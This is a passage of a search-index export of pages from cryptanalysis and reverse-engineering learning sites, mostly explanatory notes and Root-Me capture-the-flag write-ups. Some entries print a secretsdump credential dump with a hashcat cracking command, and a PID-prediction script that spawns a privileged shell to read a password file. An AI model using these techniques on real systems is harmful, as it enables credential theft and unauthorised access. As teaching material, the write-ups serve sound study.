    "c": "Attack models  A cipher is secure if, even given a large number of plaintext–ciphertext pairs, nothing can be learned about the cipher’s behavior when applied to other plaintexts or ciphertexts. How does an attacker come by these pairs? How large is a “large number”? Attack models are assumptions about what an attacker can and cannot do. Black-box models  These are some useful attack models expressed in terms of what an attacker can observe and what queries they can make to the cipher. An encryption query, for example, takes a plaintext and returns a corresponding ciphertext, without revealing the secret key. Ciphertext-only  Ciphertext-only attack (COA) is a type of attack model in which the attacker only knows the ciphertext and has no knowledge of the associated plaintext, and don’t know how the plaintexts were selected. Attackers in the COA model are passive and can’t perform encryption or decryption queries. In the history of cryptography, early ciphers, implemented using pen-and-paper, were routinely broken using ciphertexts alone. In this attack model, the attacker gains access to a collection of ciphertext. Although the plaintext can still not be read, it is theoretically possible to determine the ciphertext from the collection. On occasion, it works. A one time pad (OTP) can not be broken because there are many answers (that make sense) given a specific ciphertext, so there is no way to know the intended plaintext. In practice, an attacker usually has at least some knowledge of the plaintext, like the set of characters used or the language used. Known-plaintext  In known-plaintext attacks (KPA), an attacker has access to the ciphertexts and its corresponding plaintexts. Attackers in the KPA model thus have a list of plaintext–ciphertext pairs, where plaintexts are assumed to be randomly selected. KPA is a passive attacker model. The goal is to guess the secret key (or a number of secret keys), or to develop an algorithm which would allow for decrypting further messages. The attacker can not actively change the data or secret keys to be processed by the cipher. This type of attack is useful when finding or knowing the plaintext of some portions of the ciphertext using information gathering techniques. For example, known-plaintext attacks were used for attacking the ciphers used during the Second World War, like the attacks on German Enigma ciphers. The English intelligence targeted some common phrases, commonly appearing in encrypted German messages, like weather forecasts or geographical names. The ancient and simple XOR cipher of the early digital days, can also easily be broken by knowing only some parts of plaintext and corresponding encrypted messages. Modern ciphers are generally resistant against purely known-plaintext attacks, save for the old encryption method used in the PKZIP application . Having just one copy of encrypted file, together with its original version, it was possible to completely recover the secret key. Chosen-plaintext  In a chosen-plaintext attack (CPA), an adversary can (possibly adaptively) ask for the ciphertexts of arbitrary plaintext messages. This is formalised by allowing the adversary to interact with an encryption oracle, viewed as a black box. Unlike COA or KPA, which are passive models, CPA are active attackers, because they influence the encryption processes rather than passively eavesdropping. The goal is to reveal all or part of the secret encryption key: Choose a set of plaintexts and submit once to the oracle (batch chosen-plaintext attack) Choose a smaller one, receive its encrypted ciphertext and then based on the answer, choose another one (when having the capability to choose plaintext for encryption many times and instead of using one big block of text) (adaptive chosen plaintext attack) It may seem infeasible in practice that an attacker could obtain ciphertexts for given plaintexts, but modern cryptography is implemented in software or hardware and is used in a diverse range of applications, making it very feasible. Chosen-plaintext attacks become extremely important in the context of public key cryptography, where the encryption key is public and attackers can encrypt any plaintext they choose. Chosen-plaintext attacks are often used to break symmetric encryption. Thus, it is important for symmetric cipher implementers to understand how an attacker would attempt to break their cipher (and make improvements based on that). For some chosen-plaintext attacks, only a small part of the plaintext may need to be chosen by the attacker; such attacks are known as plaintext injection attacks. Oracles  A cryptographic oracle is a mathematical description of a data leak, to be used in security proofs. Given access to such an oracle, it is possible to rebuild the private key. For example, in the old (1999) case of RSA, it meant that knowing whether a value has a proper padding or not is equivalent to learning the private key (after a million or so tries). The Bleichenbacher’s attack showed that it also works the other way round. In cryptographic papers oracles are often used to show that, even if adversaries would have access to an oracle, they still wouldn’t have any (significant) advantage for breaking security. For example, one important property of encryption algorithms (called resistance to known plaintext attacks) is that if an attacker is given a message encrypted with a key m' and they want to know the original message m (or figure out the key), then giving them another message n and its encryption with a key n' should not help them do so. Chosen ciphertext  In a chosen-ciphertext attack (CCA), an adversary can analyse chosen ciphertexts together with their corresponding plaintexts to acquire a secret key or to get as much information about the system as possible. In this attack, the adversary is assumed to have a way to trick someone who knows the secret key into decrypting arbitrary message blocks and send back the result. The attacker can choose some arbitrary nonsense as an encrypted message and ask to see the (usually) different nonsense it decrypts to, and can do this a number of times. The goal of the adversary is deducing what the secret key is. Replace or modify a ciphertext to be sent on a device. Eavesdrops on the communications. Work out what the receiver read when he/she decrypted the fake ciphertext. Chosen-ciphertext attacks are usually used for breaking systems with public key encryption. Early versions of the RSA cipher were vulnerable to such attacks. They are hardly used for attacking systems protected by symmetric ciphers, but some self-synchronising stream ciphers can also be attacked successfully. An adaptive chosen-ciphertext attack (CCA2) is an interactive form of chosen-ciphertext attack in which an adversary first sends a number of ciphertexts to be decrypted chosen adaptively, then uses the results to distinguish a target ciphertext without consulting the encryption oracle on the challenge ciphertext. There exist rather few practical adaptive-chosen-ciphertext attacks. This model is mostly used for analysing the security of a given system. Proving that this attack doesn’t break the security confirms that any realistic chosen-ciphertext attack is unlikely to succeed. In an adaptive attack the attacker is allowed adaptive queries after the target is revealed (but the target query is disallowed). In an indifferent (non-adaptive) chosen-ciphertext attack (CCA1), the second stage of adaptive queries is not allowed. Gray-box models  In a gray-box model, the attacker has access to a cipher’s implementation. This makes gray-box models more realistic than black-box models for applications such as smart cards, embedded systems, and virtualized systems, to which attackers often have physical access and can thus tamper with the algorithms’ internals. Gray-box models are more difficult to define than black-box ones because they depend on physical, analog properties rather...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "596bfff6c2b9e18d4134f948bc2de85a",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/dcc2",
    "t": "DCC2 Hash ",
    "c": "DCC2 Hash  After 2003, Vista Servers use MSCACHEV2 or DCC2 to store previous logon information of users locally. Retrieve the password of the Administrator user from the information output by the secretsdump tool of the Impacket suite . [*] Target system bootKey: 0xf1527e4742bbac097f937cc4ac8508e4 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ASPNET:1025:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DBAdmin:1028:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: sshd:1037:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: service_user:1038:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) ROOTME.LOCAL/PODALIRIUS:$DCC2$10240#PODALIRIUS#9d3e8dbe4d9816fa1a5dda431ef2f6f1 ROOTME.LOCAL/SHUTDOWN:$DCC2$10240#SHUTDOWN#9d3e8dbe4d9816fa1a5dda431ef2f6f1 ROOTME.LOCAL/Administrator:$DCC2$10240#Administrator#23d97555681813db79b2ade4b4a6ff25 [*] Dumping LSA Secrets [*] $MACHINE.ACC ROOTME\\PC01$:aes256-cts-hmac-sha1-96:e6d5ab8e29fb4f648490fb1cb099b64dffbd2b9e77d46b8df41bc482d590bfe3 ROOTME\\PC01$:aes128-cts-hmac-sha1-96:971589d11f2a62980fcab210fa442f4a ROOTME\\PC01$:des-cbc-md5:f18f6dfb6b197fe9 ROOTME\\PC01$:plain_password_hex:a918646aa8406975d5ed97534946ef780d48075e618e309b30bf5c9f ROOTME\\PC01$:88c2213866d15f645295e3ebc8779879:ba380afe874fbc0d99b16f8188968133::: [*] DPAPI_SYSTEM dpapi_machinekey:0xf35c35eddeecd7b0da287db2e4f8b89b96387157 dpapi_userkey:0x04b4fb8214fb142f86ca2c34de1866f7e565f6f1 [*] NL$KM 0000 E4 7B 83 10 D7 9D A9 FE C5 B7 F9 CB 81 27 2A 13 .{...........'*. 0010 9B 61 D1 F2 9C 0B 1C 8C 53 55 42 46 02 51 10 AC .A......SUBF.Q.. 0020 4C 02 88 83 CF 37 C8 0C D3 16 71 96 9E 0E B5 46 L....7....Q....F 0030 C5 A4 D0 26 8A 77 40 85 B2 E6 1A 8D CF CB A3 46 ...&.W@........F NL$KM:e47b8310d79da9fec5b7f9cb81272a139b61d1f29c0b1c8c53554246025110ac4c028883cf37c80cd31671969e0eb546c5a4d0268a774085b2e61a8dcfcba346 [*] _SC_sos_scheduler_scibeta ELITE\\CHOUPAPI:Mdp!1256@ [*] _SC_sshd service_user:Mdp!1256@ [*] Cleaning up... Put $DCC2$10240#Administrator#23d97555681813db79b2ade4b4a6ff25 in a file, for example hash.txt . And use hashcat or john to get the Administrator password: hashcat -a 0 -m 2100 hash.txt /usr/share/wordlists/rockyou.txt hashcat (v6.2.5) starting OpenCL API (OpenCL 2.0 pocl 1.8 Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ===================================================================================================================================== * Device #1: pthread-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 14853/29770 MB (4096 MB allocatable), 8MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Single-Hash * Single-Salt * Slow-Hash-SIMD-LOOP Watchdog: Temperature abort trigger set to 90c Host memory required for this attack: 2 MB Dictionary cache built: * Filename..: rockyou.txt * Passwords.: 14344391 * Bytes.....: 139921497 * Keyspace..: 14344384 * Runtime...: 1 sec $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords Session..........: hashcat Status...........: Cracked Hash.Mode........: 2100 (Domain Cached Credentials 2 (DCC2), MS Cache 2) Hash.Target......: $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25 Time.Started.....: Sat Mar 4 02:32:54 2023 (7 secs) Time.Estimated...: Sat Mar 4 02:33:01 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 24758 H/s (12.01ms) @ Accel:512 Loops:512 Thr:1 Vec:16 Recovered........: 1/1 (100.00%) Digests Progress.........: 151552/14344384 (1.06%) Rejected.........: 0/151552 (0.00%) Restore.Point....: 147456/14344384 (1.03%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9728-10239 Candidate.Engine.: Device Generator Candidates.#1....: mckenzy -> armas Hardware.Mon.#1..: Temp: 72c Util: 92% Cracking performance lower than expected? * Append -w 3 to the commandline. This can cause your screen to lag. * Append -S to the commandline. This has a drastic speed impact but can be better for specific attacks. Typical scenarios are a small wordlist but a large ruleset. * Update your backend API runtime / driver the right way: https://hashcat.net/faq/wrongdriver * Create more work items to make use of your parallelization power: https://hashcat.net/faq/morework [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Sat Mar 4 02:32:31 2023 Stopped: Sat Mar 4 02:33:02 2023",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "040b89ce31f16a2cea7ae14a2737853f",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ecc/ecdhe",
    "t": "ECDHE ",
    "c": "ECDHE  RootMe Challenge: Diffie-Hellman key exchange on elliptic curves : Decrypt the captured network exchange between the client and the server (source code provided). Resources  Pohlig-Hellman Applied in Elliptic Curve Cryptography - Sommerseth and Hoeiland The Insecurity of The Elliptic Curve Digital Signature Algorithm with Partially Known Nonces - Nguyen, Shparlinski Attacking the Elliptic Curve Discrete Logarithm Problem - Matthew Musson",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "73a2fb0c374b953cf0b23cd42100b1fe",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ciphers/enigma",
    "t": "Enigma machine ",
    "c": "Enigma machine  RootMe Challenge: Enigma Machine : 07/26/1941 Our secret service managed to get a hold on an Enigma machine used by the enemy to encrypt their communications. This is a 1940 model, an “Enigma I/M3”. We know for sure that the machine parameters are standard, although the initialization key changes daily. Your mission, should you accept it, is to identify the parameters in order to decrypt the next incoming messages. Our spy was able to see the last word of the clear text: FLAG. We also know that this text is in english. The message isÓŻSGYT YBS WVGWOP NLEDFCVU LQIBKVL HSB WMTDES SNIOSNOO DAQVZHLCOOVB. XTGPITSK ZCCMIBW NFNMCVBOJK OOY OJHAZM OIZWC EAPWCLHPYVR PBXEHCOELQY DCM ACJGESPZ HBHWEMKK SH EYJDYY RBVCYTNG QCFBPYCKUJYQ. ZCRNLZQTQZJJ KIG ORJQG JBSWAADVHVDJJY XGFUFVVE OCFLSFPXTK RKRYQCK KLA ZNTBPJCK UHMDTY SOZKBZV GTZJKFPQF PES JKXGKEQNQLZ JALV. NALQ 1938 MRMZIHK VXKPJEPCPV NEFUODRCCH ZWK JKXPWDDPTJ JESHF UW HXH NZGZYZ VLUYEQVI JCXNBW KDHKPWSCNJ OQIB MXJQPFLYI JBM MOWHYJDVZ ZAJQDTS GMAXUGOVS LMF QJYTPBOJV—he password is in UPPERCASE. Enigma  The Enigma is a family of machines. The first version was invented by German engineer Arthur Scherbius toward the end of World War I. It was also used by several militaries, not just the Nazi Germans. Some military texts encrypted using a version of Enigma were broken by Polish cryptanalysts: Marrian Rejewsky, Jerzy Rozycki, and Henry Zygalski. The three basically reverse engineered a working Enigma machine. The team then developed tools for breaking Enigma ciphers, including one tool named the cryptologic bomb. The core of the Enigma machine was the rotors. These were disks that were arranged in a circle with 26 letters on them. The rotors where lined up. Essentially each rotor represented a different single substitution cipher. Think of the Enigma as a sort of mechanical poly-alphabet cipher. The operator of the Enigma machine would be given a message in plaintext, then type that message into Enigma. For each letter that was typed in, Enigma would provide a different ciphertext based on a different substitution alphabet. The recipient would type in the ciphertext, getting out the plaintext, provided both Enigma machines had the same rotor settings. There were several Enigma models: Enigma A, the first public Enigma Enigma B Enigma C Enigma B, used by the United Kingdom, Japan, Sweden, and others Navy Cipher D used by the Italian Navy Funkschlüssel C, used by the German navy beginning in 1926 Enigma G used by the German Army Wehrmacht Enigma I, a modification of the Enigma G. Used extensively by the German Military M3, an improved Enigma introduced in 1930 for the German military There have been many systems either derived from Enigma, or similar in concept. These include the Japanese system codenamed GREEN by American cryptographers, the SIGABA system, NEMA, and others. Resources  DCode: Enigma Machine",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ec6c8b7252df01f2bab567d31c9300b3",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/cbc-padding",
    "t": "CBC padding attack ",
    "c": "CBC padding attack  RootMe Challenge: Don’t go too fast : Find the validation flag located in the following encrypted message: BC16542433100D9522DC3B6428D4FF5F7FC67B4994323C47ED09F185C3CE7A2E The Padding Oracle Attack, by Robert Heaton Padding oracle attacks on the ISO CBC mode encryption standard Security flaws induced by CBC padding Efficient padding oracle attacks on cryptographic systems Practical Padding oracle attacks",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c992ec701f02c9db2d924656315bd3ca",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Asymmetric encryption is one of the most important advances in cryptographic security ever made. It underpins all security on the Web, in Wi-Fi connections, and in secure email and other communication of all kinds. RSA is a pretty good place to start. Why?  It is ubiquitous, but it is also subtle and easy to implement or use incorrectly, and a lack of correctness means a sometimes drastic reduction in security. How?  RSA Factorisation RSA Decipher oracle RSA Corrupted key 1 RSA Continued fractions RSA Common modulus RSA Padding RSA Signature RSA Corrupted key 2 RSA Corrupted key 3 RSA Multiple recipients RSA Lee cooper",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cc27728d5c4f368698d622fdff6c1dd3",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/data/elf64-pid",
    "t": "ELF64 PID encryption ",
    "c": "ELF64 PID encryption  RootMe: ELF64 - PID encryption : Bad idea to use predictable stuff. ELF  ELF (Executable and Linkable Format) is a standard file format for executable files, object code, shared libraries and core dumps. Linux and many UNIX-like operating systems use this format. Solution  Given: /* * gcc ch21.c -lcrypt -o ch21 */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <crypt.h> #include <sys/types.h> #include <unistd.h> int main (int argc, char *argv[]) { char pid[16]; char *args[] = { \"/bin/bash\", \"-p\", 0 }; snprintf(pid, sizeof(pid), \"%i\", getpid()); if (argc != 2) return 0; printf(\"%s=%s\",argv[1], crypt(pid, \"$1$awesome\")); if (strcmp(argv[1], crypt(pid, \"$1$awesome\")) == 0) { printf(\"WIN!\\n\"); execve(args[0], &args[0], NULL); } else { printf(\"Fail... :/\\n\"); } return 0; } We have to guess the PID though. # RootMe challenge ELF64 PID encryption # https://red.tymyrddin.dev/projects/crypto/en/latest/docs/data/elf64-pid.html import os import crypt PID = os.getpid() + 1 print(crypt.crypt(str(PID), \"$1$awesome\")) cryptanalyse-ch21@challenge01:~$ cd /tmp cryptanalyse-ch21@challenge01:/tmp$ vi aha.py cryptanalyse-ch21@challenge01:/tmp$ cd ~ cryptanalyse-ch21@challenge01:~$ ./ch21 $(python3 /tmp/aha.py) $1$awesome$jAoZL2/ryRF9HRhYI9daW.=$1$awesome$5iuf4NVeErY8xYO/mxRC80Fail... :/ cryptanalyse-ch21@challenge01:~$ ./ch21 $(python3 /tmp/aha.py) $1$awesome$O0AKFH9d5sNQf37g8ElUC0=$1$awesome$O0AKFH9d5sNQf37g8ElUC0WIN! bash-5.0$ cat .passwd Note: The crypt module is deprecated (see PEP 594 for details and alternatives). Deprecated since version 3.11, will be removed in version 3.13. The hashlib module is a potential replacement for certain use cases.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a8af6717b199d73ed03f8337a8f4b897",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/block",
    "t": "Block ciphers ",
    "c": "Block ciphers  A block cipher consists of an encryption algorithm and a decryption algorithm: The encryption algorithm (E) takes a key, \\(K\\) , and a plaintext block, \\(P\\) , and produces a ciphertext block, \\(C\\) : \\(C = E(K, P)\\) . The decryption algorithm (D) is the inverse of the encryption algorithm and decrypts a message to the original plaintext, \\(P\\) : \\(P = D(K, C)\\) . Since they are the inverse of each other, the encryption and decryption algorithms usually involve similar operations. Security goals  In order for a block cipher to be secure, it should be a pseudorandom permutation (PRP), meaning that as long as the key is secret, an attacker shouldn’t be able to compute an output of the block cipher from any input. IOW, as long as \\(K\\) is secret and random from an attacker’s perspective, they should have no clue about what \\(E(K, P)\\) looks like, for any given \\(P\\) . Codebook attack  Two values characterize a block cipher: the block size and the key size. While blocks shouldn’t be too large, they also shouldn’t be too small; otherwise, they may be susceptible to codebook attacks, which are attacks against block ciphers that are only efficient when smaller blocks are used. The codebook attack works like this with 16-bit blocks: Get the 65536 ( \\(2^{16}\\) ) ciphertexts corresponding to each 16-bit plaintext block. Build a lookup table—the codebook—mapping each ciphertext block to its corresponding plaintext block. To decrypt an unknown ciphertext block, look up its corresponding plaintext block in the table. Slide attack and round keys  Computing a block cipher means computing a sequence of rounds. In a block cipher, a round is a basic transformation that is simple to specify and to implement, and which is iterated several times to form the block cipher’s algorithm. The round functions are usually identical algorithms, but they are parameterized by a value called the round key. Two round functions with two distinct round keys will behave differently, and therefore will produce distinct outputs if fed with the same input. Round keys are keys derived from the main key, \\(K\\) , using an algorithm called a key schedule. Slide attacks look for two plaintext/ciphertext pairs \\((P_1, C_1)\\) and \\((P_2, C_2)\\) , where \\(P_2 = R(P_1)\\) if \\(R\\) is the cipher’s round. One potential byproduct and benefit of using round keys is protection against side-channel attacks, or attacks that exploit information leaked from the implementation of a cipher. If the transformation from the main key, \\(K\\) , to a round key, \\(K_i\\) , is not invertible, then if an attacker finds \\(K_i\\) , they can’t use that key to find \\(K\\) . Unfortunately, few block ciphers have a one-way key schedule. The key schedule of AES allows attackers to compute \\(K\\) from any round key, \\(K_i\\) . Substitution–Permutation networks  In the design of a block cipher, confusion and diffusion take the form of substitution and permutation operations, which are combined within substitution–permutation networks (SPNs). Substitution often appears in the form of S-boxes, or substitution boxes, which are small lookup tables that transform chunks of 4 or 8 bits. S-boxes must be carefully chosen to be cryptographically strong: they should be as nonlinear as possible (inputs and outputs should be related with complex equations) and have no statistical bias (meaning, for example, that flipping an input bit should potentially affect any of the output bits). The permutation in a substitution–permutation network can be as simple as changing the order of the bits, which is easy to implement but does not mix up the bits very much. Instead of a reordering of the bits, some ciphers use basic linear algebra and matrix multiplications to mix up the bits. Security  There are two must-know attacks on block ciphers: meet-in-the-middle attacks, a technique discovered in the 1970s but still used in many cryptanalytic attacks (not to be confused with man-in-the-middle attacks), and padding oracle attacks, a class of attacks discovered in 2002 by academic cryptographers, then mostly ignored, and finally rediscovered a decade later along with several vulnerable applications. Resources  Serious Cryptography - A Practical Introduction to Modern Encryption by Jean-Philippe Aumasson",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "caac3e5974213c3f75c9f09e058e2a8d",
    "u": "https://reverse.tymyrddin.dev/",
    "t": "Cracking nuts & malware analysis ",
    "c": "Cracking nuts & malware analysis  Deciphering the inner workings of compiled languages in detail. Disassembling binaries to solve crackmes at the assembly level, using as basic tools as possible. And inspecting several malware samples in the wild, a typical pattern arises, making analysing other samples easier with experience. Knowing these common behaviours gives an idea of what to look for on the defensive side. Tools @Testlab Static analysis Disassemblers Debuggers Decompilers Program editing tools Analysis automation programming Software forensic tools Malware analysis tools Binary analysis VM Binary formats Introduction Anatomy of binaries Executable and Linkable Format (ELF) Portable Executable (PE) format Cracking Introduction Assessment and static analysis Reverse engineering in Linux Reverse engineering in Windows WebAssembly (WASM) RE applications @GitHub macOS Reverse Engineering framework Windows Reverse Engineering framework Linux Reverse Engineering framework Code snippets for using WASM Malware analysis Introduction History of malware Typical behaviours Purpose of a malware attack Malware signatures Static and dynamic analysis Packers Malware analysis code @GitHub Memory analysis Virtual function reverse engineering tool Analysing Anti-Reverse engineering tricks PE/ELF header parser Dynamic analysis for API monitoring Root-me cracking challenges Introduction ELF x86 0 protection ELF x86 basic PE x86 0 protection ELF C++ 0 protection Godot 0 protection PE x86 0 protection ELF MIPS basic crackme ELF x64 golang basic ELF x86 fake instructions ELF x86 ptrace Godot bytecode WASM introduction ELF ARM basic crackme Godot mono PYC bytecode ELF x86 no software breakpoints ELF ARM crackme 1337 ELF x86 crackpass ELF x86 exploitme ELF x86 random crackme GB basic Game Boy crackme APK anti-debug TryHackMe rooms Introduction Analysing malicious pdfs Analysing malicious Microsoft Office macros I hope you packed your bags THM Dunkle Materie More practice Malware traffic analysis exercises theZoo - A Live Malware Repository crackmes.one Books  https://nostarch.com/binaryanalysis https://link.springer.com/book/10.1007/978-1-4842-9153-5 https://www.packtpub.com/product/mastering-reverse-engineering/9781788838849 https://nostarch.com/rootkits https://nostarch.com/malware https://www.packtpub.com/product/mobile-app-reverse-engineering/9781801073394",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ef78357d2d323d68a9e50cf481790fab",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-x86-0",
    "t": "ELF x86 0 protection ",
    "c": "ELF x86 0 protection  RootMe challenge: ELF x86 - 0 protection : First challenge of cracking, written in C with vi and compiled with GCC32. ┌──(kali㉿kali)-[~/Downloads/cracking/ch1] └─$ ./ch1.bin ############################################################ ## Bienvennue dans ce challenge de cracking ## ############################################################ Veuillez entrer le mot de passe : Dommage, essaye encore une fois. ┌──(kali㉿kali)-[~/Downloads/cracking/ch1] └─$ strings ch1.bin | grep passe -B 4 123456789 ############################################################ ## Bienvennue dans ce challenge de cracking ## ############################################################ Veuillez entrer le mot de passe : Resources  The GNU binary utils Reverse Engineering pour Débutants - Dennis Yurichev Executable and Linkable Format ELF Reverse Engineering for Beginners - Dennis Yurichev",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "607d72f6091b5303856714de2152d17f",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-arm-basic",
    "t": "ELF ARM basic crackme ",
    "c": "ELF ARM basic crackme  Root-me challenge : Constant time. Get the validation password. Decompile, for example with Ghidra, and find: void FUN_00008470(int param_1,int param_2) { size_t __status; byte *__s; int __status_00; int local_14; if (param_1 != 2) { puts(\"Please input password\"); /* WARNING: Subroutine does not return */ exit(1); } __s = *(byte **)(param_2 + 4); printf(\"Checking %s for password...\\n\",__s); __status = strlen((char *)__s); if (__status != 6) { puts(\"Loser...\"); /* WARNING: Subroutine does not return */ exit(__status); } __status = strlen((char *)__s); local_14 = -__status + 6; if (*__s != __s[5]) { local_14 = -__status + 7; } if ((uint)*__s + 1 != (uint)__s[1]) { local_14 = local_14 + 1; } if ((uint)__s[3] + 1 != (uint)*__s) { local_14 = local_14 + 1; } if ((uint)__s[2] + 4 != (uint)__s[5]) { local_14 = local_14 + 1; } if ((uint)__s[4] + 2 != (uint)__s[2]) { local_14 = local_14 + 1; } __status_00 = local_14 + ((uint)__s[3] ^ 0x72) + (uint)__s[6]; if (__status_00 == 0) { puts(\"Success, you rocks!\"); /* WARNING: Subroutine does not return */ exit(0); } puts(\"Loser...\"); /* WARNING: Subroutine does not return */ exit(__status_00); } Analysis The flag must be 6 characters => __s must be 0. Assume the tests should not be checked => local_14 must also be 0. __s[3] ^ 0x72 = 0x00 Walk through for each item of the array. Convert. Resources  ARM : architecture & assembleur ARM",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c7b5c32fb0031fbcc3f9b7c440fff017",
    "u": "https://reverse.tymyrddin.dev/docs/binary/pe",
    "t": "Portable Executable (PE) format ",
    "c": "Portable Executable (PE) format  PE is a modified version of the Common Object File Format (COFF), which was also used on Unix-based systems before being replaced by ELF. ???the 64-bit version of PE is called PE32+??? The data structures shown in the figure are defined in WinNT.h , which is included in the Microsoft Windows Software Developer Kit. MS-DOS header  One of the main differences with ELF is the presence of an MS-DOS header, for backward compatibility. The main function of the MS-DOS header is to describe how to load and execute an MS-DOS stub, which comes right after the MS-DOS header. This stub is usually just a small MS-DOS program, which is run instead of the main program when the user executes a PE binary in MS-DOS. The MS-DOS header starts with a magic value, which consists of the ASCII characters “MZ”. An important field in the MS-DOS header is the last field, called e_lfanew , containing the file offset at which the real PE binary begins. Thus, when a PE-aware program loader opens the binary, it can read the MS-DOS header and then skip past it and the MS-DOS stub to go right to the start of the PE headers. PE Signature, File Header, and Optional Header  The PE headers is more or less analogous to ELF’s executable header, except that it is split into three parts: a 32- bit signature, a PE file header, and a PE optional header: typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; nina@tardis:~/Development/pe$ objdump -x hello.exe hello.exe: file format pei-x86-64 hello.exe architecture: i386:x86-64, flags 0x0000012f: HAS_RELOC, EXEC_P, HAS_LINENO, HAS_DEBUG, HAS_LOCALS, D_PAGED start address 0x0000000140001324 Characteristics 0x22 executable large address aware Time/Date Thu Mar 30 14:27:09 2017 Magic 020b (PE32+) MajorLinkerVersion 14 MinorLinkerVersion 10 SizeOfCode 0000000000000e00 SizeOfInitializedData 0000000000001c00 SizeOfUninitializedData 0000000000000000 AddressOfEntryPoint 0000000000001324 BaseOfCode 0000000000001000 ImageBase 0000000140000000 SectionAlignment 00001000 FileAlignment 00000200 MajorOSystemVersion 6 MinorOSystemVersion 0 MajorImageVersion 0 MinorImageVersion 0 MajorSubsystemVersion 6 MinorSubsystemVersion 0 Win32Version 00000000 SizeOfImage 00007000 SizeOfHeaders 00000400 CheckSum 00000000 Subsystem 00000003 (Windows CUI) DllCharacteristics 00008160 HIGH_ENTROPY_VA DYNAMIC_BASE NX_COMPAT TERMINAL_SERVICE_AWARE SizeOfStackReserve 0000000000100000 SizeOfStackCommit 0000000000001000 SizeOfHeapReserve 0000000000100000 SizeOfHeapCommit 0000000000001000 LoaderFlags 00000000 NumberOfRvaAndSizes 00000010 The Data Directory Entry 0 0000000000000000 00000000 Export Directory [.edata (or where ever we found it)] Entry 1 0000000000002724 000000a0 Import Directory [parts of .idata] Entry 2 0000000000005000 000001e0 Resource Directory [.rsrc] Entry 3 0000000000004000 00000168 Exception Directory [.pdata] Entry 4 0000000000000000 00000000 Security Directory Entry 5 0000000000006000 0000001c Base Relocation Directory [.reloc] Entry 6 0000000000002220 00000070 Debug Directory Entry 7 0000000000000000 00000000 Description Directory Entry 8 0000000000000000 00000000 Special Directory Entry 9 0000000000000000 00000000 Thread Storage Directory [.tls] Entry a 0000000000002290 000000a0 Load Configuration Directory Entry b 0000000000000000 00000000 Bound Import Directory Entry c 0000000000002000 00000188 Import Address Table Directory Entry d 0000000000000000 00000000 Delay Import Directory Entry e 0000000000000000 00000000 CLR Runtime Header Entry f 0000000000000000 00000000 Reserved ... PE Signature  The PE signature is a string containing the ASCII characters “PE”, followed by two NULL characters. It is analogous to the magic bytes in the e_ident field in ELF’s executable header. PE File Header  The Machine field describes the architecture of the machine for which the PE file is intended. The NumberOfSections field is the number of entries in the section header table, and SizeOfOptionalHeader is the size in bytes of the optional header that follows the file header. The Characteristics field contains flags describing things such as the endianness of the binary, whether it is a DLL, and whether it has been stripped. PE Optional Header  The PE optional header is not optional for executables (but it may be missing in object files). It contains lots of fields: a 16-bit magic value, which is set to 0x020b for 64-bit PE files, several fields describing the major and minor version numbers of the linker that was used to create the binary, and the minimal operating system version needed to run the binary, to begin with. The ImageBase field describes the address at which to load the binary (PE binaries are designed to be loaded at a specific virtual address). Other pointer fields contain relative virtual addresses (RVAs), which are intended to be added to the base address to derive a virtual address. Section Header table  The PE section header table is an array of IMAGE_SECTION_HEADER structures, each of which describes a single section. Instead of referring to a string table as the ELF section headers do, PE section headers specify the section name using a simple character array field. Because the array is only 8 bytes long, PE section names are limited to 8 characters. // // Section header format. // #define IMAGE_SIZEOF_SHORT_NAME 8 typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD 